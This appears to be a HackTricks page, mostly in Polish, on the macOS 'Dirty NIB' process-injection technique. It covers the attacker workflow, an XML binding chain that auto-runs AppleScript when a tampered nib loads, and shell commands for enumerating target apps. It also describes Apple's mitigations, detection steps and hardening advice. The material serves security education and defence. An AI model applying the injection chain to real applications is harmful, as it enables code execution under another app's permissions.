# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB odnosi się do nadużywania plików Interface Builder (.xib/.nib) wewnątrz podpisanego bundle aplikacji macOS w celu wykonania logiki kontrolowanej przez atakującego w docelowym procesie, dziedzicząc w ten sposób jego entitlements i TCC permissions. Technika została pierwotnie opisana przez xpn (MDSec), a później uogólniona i znacznie rozszerzona przez Sector7, który także omówił mitygacje Apple w macOS 13 Ventura i macOS 14 Sonoma. Aby uzyskać tło i dogłębne analizy, zobacz referencje na końcu.

> TL;DR
> • Before macOS 13 Ventura: zastąpienie MainMenu.nib w bundle (lub innego nib ładowanego przy starcie) mogło niezawodnie umożliwić wstrzyknięcie do procesu i często eskalację uprawnień.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission w dużej mierze uniemożliwiają modyfikacje nib po uruchomieniu przez niepowiązane aplikacje. Ataki mogą być nadal możliwe w niszowych przypadkach (np. narzędzia od tego samego dewelopera modyfikujące własne aplikacje, lub terminale, którym użytkownik nadał App Management/Full Disk Access).

## What are NIB/XIB files

Pliki Nib (skrót od NeXT Interface Builder) to zserializowane grafy obiektów UI używane przez aplikacje AppKit. Nowoczesne Xcode przechowuje edytowalne pliki XML .xib, które są kompilowane do .nib w czasie budowania. Typowa aplikacja ładuje główny interfejs za pomocą `NSApplicationMain()` która odczytuje klucz `NSMainNibFile` z Info.plist aplikacji i instancjuje graf obiektów w czasie wykonania.

Key points that enable the attack:
- NIB loading instancjuje dowolne klasy Objective‑C bez wymogu, aby implementowały NSSecureCoding (Apple’s nib loader falls back to `init`/`initWithFrame:` when `initWithCoder:` is not available).
- Cocoa Bindings mogą być nadużywane do wywoływania metod w trakcie instancjonowania nibów, w tym łańcuchowych wywołań, które nie wymagają interakcji użytkownika.

## Dirty NIB injection process (attacker view)

The classic pre‑Ventura flow:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Użyj bindings, aby ustawić target/selector elementu menu, a następnie wywołaj prywatną metodę `_corePerformAction`, tak aby akcja uruchomiła się automatycznie podczas ładowania nib. Dzięki temu nie jest potrzebne kliknięcie użytkownika.

Minimalny przykład łańcucha auto‑wyzwalania wewnątrz .xib (skrócony dla przejrzystości):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
This achieves arbitrary AppleScript execution in the target process upon nib load. Advanced chains can:
- Instantiate arbitrary AppKit classes (e.g., `NSTask`) and call zero‑argument methods like `-launch`.
- Call arbitrary selectors with object arguments via the binding trick above.
- Load AppleScriptObjC.framework to bridge into Objective‑C and even call selected C APIs.
- On older systems that still include Python.framework, bridge into Python and then use `ctypes` to call arbitrary C functions (Sector7’s research).

3) Zastąp nib aplikacji
- Skopiuj target.app do zapisywalnej lokalizacji, zastąp np. `Contents/Resources/MainMenu.nib` złośliwym nibem i uruchom target.app. Przed Venturą, po jednorazowej ocenie przez Gatekeeper, kolejne uruchomienia wykonywały tylko płytkie sprawdzenia podpisu, więc zasoby nie‑wykonywalne (jak .nib) nie były ponownie walidowane.

Przykładowy AppleScript payload dla widocznego testu:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Nowoczesne zabezpieczenia macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple wprowadził kilka systemowych mechanizmów łagodzących, które radykalnie zmniejszają skuteczność Dirty NIB w nowoczesnym macOS:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- Przy pierwszym uruchomieniu dowolnej aplikacji (poddanej kwarantannie lub nie) przeprowadzana jest głęboka weryfikacja podpisu obejmująca wszystkie zasoby bundle. Następnie bundle staje się chroniony: tylko aplikacje od tego samego dewelopera (lub wyraźnie dozwolone przez aplikację) mogą modyfikować jego zawartość. Inne aplikacje wymagają nowego uprawnienia TCC „App Management”, aby zapisywać w bundle innej aplikacji.
- Launch Constraints (macOS 13 Ventura)
- Aplikacje systemowe/dostarczane przez Apple nie mogą być kopiowane w inne miejsce i uruchamiane; to zabija podejście „copy to /tmp, patch, run” dla aplikacji OS.
- Usprawnienia w macOS 14 Sonoma
- Apple wzmocnił App Management i naprawił znane obejścia (np. CVE‑2023‑40450) zgłoszone przez Sector7. Python.framework został usunięty wcześniej (macOS 12.3), co przerwało niektóre łańcuchy eskalacji uprawnień.
- Gatekeeper/Quarantine changes
- Dla szerszej dyskusji o Gatekeeper, pochodzeniu (provenance) i zmianach w mechanizmach oceny (assessment), które wpłynęły na tę technikę, zobacz stronę wymienioną poniżej.

> Praktyczne implikacje
> • Na Ventura+ generalnie nie można modyfikować .nib aplikacji stron trzecich, chyba że Twój proces ma App Management lub jest podpisany tym samym Team ID co cel (np. narzędzia deweloperskie).
> • Przyznanie App Management lub Full Disk Access powłokom/terminalom skutecznie ponownie otwiera tę powierzchnię ataku dla wszystkiego, co może wykonywać kod w kontekście tego terminala.


### Radzenie sobie z Launch Constraints

Launch Constraints blokują uruchamianie wielu aplikacji Apple z lokalizacji innych niż domyślne począwszy od Ventury. Jeśli polegałeś na przed‑Ventura workflowach, takich jak kopiowanie aplikacji Apple do katalogu tymczasowego, modyfikowanie `MainMenu.nib` i uruchamianie jej, spodziewaj się, że na >= 13.0 to nie zadziała.


## Enumeracja celów i nibów (przydatne do badań / systemów legacy)

- Zlokalizuj aplikacje, których UI jest oparty na nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Znajdź potencjalne zasoby nib wewnątrz bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Sprawdź dogłębnie code signatures (nie powiedzie się, jeśli manipulowałeś zasobami i nie podpisałeś ich ponownie):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Uwaga: Na nowoczesnym macOS zostaniesz także zablokowany przez bundle protection/TCC przy próbie zapisu do bundle innej aplikacji bez odpowiedniej autoryzacji.


## Wykrywanie i wskazówki DFIR

- Monitorowanie integralności plików w zasobach bundle
- Monitoruj zmiany mtime/ctime w `Contents/Resources/*.nib` oraz innych nie‑wykonywalnych zasobach zainstalowanych aplikacji.
- Zunifikowane logi i zachowanie procesów
- Monitoruj nieoczekiwane wykonanie AppleScript wewnątrz aplikacji GUI oraz procesy ładujące AppleScriptObjC lub Python.framework. Przykład:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Oceny proaktywne
- Okresowo uruchamiaj `codesign --verify --deep` dla krytycznych aplikacji, aby upewnić się, że zasoby pozostają nienaruszone.
- Kontekst uprawnień
- Przeprowadź audyt, kto/co ma w TCC „App Management” lub Full Disk Access (szczególnie terminale i agenty zarządzające). Usunięcie tych uprawnień z ogólnego przeznaczenia shelli uniemożliwia trywialne ponowne włączenie manipulacji w stylu Dirty NIB.


## Hardening defensywny (developerzy i obrońcy)

- Preferuj programowy interfejs użytkownika lub ogranicz to, co jest instancjonowane z nibów. Unikaj dołączania potężnych klas (np. `NSTask`) do grafów nib oraz unikaj wiązań, które pośrednio wywołują selektory na dowolnych obiektach.
- Przyjmij hardened runtime z Library Validation (już standard dla nowoczesnych aplikacji). Chociaż samo w sobie nie zatrzyma nib injection, blokuje łatwe ładowanie natywnego kodu i zmusza atakujących do payloadów opartych wyłącznie na skryptach.
- Nie żądaj ani nie polegaj na szerokich uprawnieniach App Management w narzędziach ogólnego przeznaczenia. Jeśli MDM wymaga App Management, odseparuj ten kontekst od shelli inicjowanych przez użytkownika.
- Regularnie weryfikuj integralność bundle aplikacji i spraw, by mechanizmy aktualizacji samonaprawiały zasoby bundle.


## Powiązana lektura w HackTricks

Dowiedz się więcej o Gatekeeper, quarantine i zmianach provenance, które wpływają na tę technikę:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Źródła

- xpn – DirtyNIB (oryginalny opis z przykładem dla Pages): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
